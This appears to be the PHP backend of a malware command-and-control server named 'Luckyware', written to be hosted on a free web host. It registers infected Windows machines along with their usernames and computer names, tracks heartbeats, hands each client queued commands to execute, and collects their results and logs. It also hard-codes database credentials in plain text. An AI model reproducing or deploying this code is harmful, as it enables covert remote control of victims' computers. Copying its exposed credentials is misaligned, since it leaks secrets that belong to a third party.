<?php
// Luckyware C&C Server API
// Upload this to your InfinityFree website root directory

header('Content-Type: text/plain');
error_reporting(0);

// Database configuration - CORRECTED HOSTNAME!
$db_host = 'sql113.infinityfree.com';  // ← FIXED! Was sql110, now sql113
$db_name = 'if0_43071029_Chrome';      // Your database name
$db_user = 'if0_43071029';             // Your database username
$db_pass = '77oUN0U6Fp';               // Your database password

// Security key (change this!)
$SECURITY_KEY = 'change_this_to_random_string_12345';

// Connect to database
try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch(PDOException $e) {
    die("db_error");
}

// Get action
$action = isset($_GET['action']) ? $_GET['action'] : '';

// Get POST data
$client_id = isset($_POST['client_id']) ? $_POST['client_id'] : '';

switch($action) {
    case 'register':
        // Register new client
        $username = isset($_POST['username']) ? $_POST['username'] : 'Unknown';
        $computer_name = isset($_POST['computer_name']) ? $_POST['computer_name'] : 'Unknown';
        $windows_version = isset($_POST['windows_version']) ? $_POST['windows_version'] : 'Unknown';
        $timestamp = isset($_POST['timestamp']) ? $_POST['timestamp'] : date('Y-m-d H:i:s');
        
        // Check if client already exists
        $stmt = $pdo->prepare("SELECT id FROM clients WHERE client_id = ?");
        $stmt->execute([$client_id]);
        
        if($stmt->rowCount() == 0) {
            // Insert new client
            $stmt = $pdo->prepare("INSERT INTO clients (client_id, username, computer_name, windows_version, first_seen, last_seen, status) VALUES (?, ?, ?, ?, NOW(), NOW(), 'online')");
            $stmt->execute([$client_id, $username, $computer_name, $windows_version]);
            echo "success:registered";
        } else {
            // Update existing client
            $stmt = $pdo->prepare("UPDATE clients SET last_seen = NOW(), status = 'online' WHERE client_id = ?");
            $stmt->execute([$client_id]);
            echo "success:updated";
        }
        break;
        
    case 'heartbeat':
        // Update last seen
        if(!empty($client_id)) {
            $stmt = $pdo->prepare("UPDATE clients SET last_seen = NOW(), status = 'online' WHERE client_id = ?");
            $stmt->execute([$client_id]);
            echo "success:heartbeat";
        }
        break;
        
    case 'get_commands':
        // Get pending commands for this client
        if(!empty($client_id)) {
            $stmt = $pdo->prepare("SELECT id, command_type, command_data FROM commands WHERE client_id = ? AND status = 'pending' ORDER BY created_at ASC LIMIT 1");
            $stmt->execute([$client_id]);
            
            if($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
                // Mark command as executing
                $updateStmt = $pdo->prepare("UPDATE commands SET status = 'executing', executed_at = NOW() WHERE id = ?");
                $updateStmt->execute([$row['id']]);
                
                // Return command in format: command_id|command_type|command_data
                echo $row['id'] . '|' . $row['command_type'] . '|' . $row['command_data'];
            } else {
                echo "no_commands";
            }
        }
        break;
        
    case 'submit_result':
        // Submit command result
        $command_id = isset($_POST['command_id']) ? $_POST['command_id'] : '';
        $result = isset($_POST['result']) ? $_POST['result'] : '';
        
        if(!empty($command_id)) {
            $stmt = $pdo->prepare("UPDATE commands SET status = 'completed', result = ?, completed_at = NOW() WHERE id = ?");
            $stmt->execute([$result, $command_id]);
            echo "success:result_submitted";
        }
        break;
        
    case 'submit_log':
        // Submit log entry
        $log_type = isset($_POST['log_type']) ? $_POST['log_type'] : 'info';
        $message = isset($_POST['message']) ? $_POST['message'] : '';
        
        if(!empty($client_id) && !empty($message)) {
            $stmt = $pdo->prepare("INSERT INTO logs (client_id, log_type, message, created_at) VALUES (?, ?, ?, NOW())");
            $stmt->execute([$client_id, $log_type, $message]);
            echo "success:log_submitted";
        }
        break;
        
    default:
        echo "invalid_action";
        break;
}
?>
